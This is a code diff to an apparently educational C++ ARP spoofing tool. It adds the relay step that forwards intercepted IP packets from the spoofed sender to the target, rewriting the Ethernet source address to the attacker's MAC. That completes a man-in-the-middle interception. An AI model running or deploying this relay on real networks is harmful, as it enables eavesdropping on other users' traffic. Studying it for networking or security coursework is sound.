@@ -5,6 +5,7 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "arp-spoof.h"
+#include "ipv4hdr.h"
 
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
@@ -92,9 +93,17 @@ int main(int argc, char* argv[]) {
 				// If an IP Packet from sender to target is recieved
 				// Relay the packet to target
 				else if (ethHdr->type() == EthHdr::Ip4 ) {
-					cout << "IP Packet Recieved!\n";
-					// Todo:
-					// Packet Relay
+					struct IPv4Hdr* ipHdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));
+
+					if (ntohl(ipHdr->ip_src) == senderIp ) {
+						cout << "Relaying Packet to Target...\n";
+						ethHdr -> smac_ = attackerMac;
+						ethHdr -> dmac_ = targetMac;
+						
+						// Send Packet
+						pcap_sendpacket(handle, packet, header->len);
+					} 
+
 				}
 			}
 		}
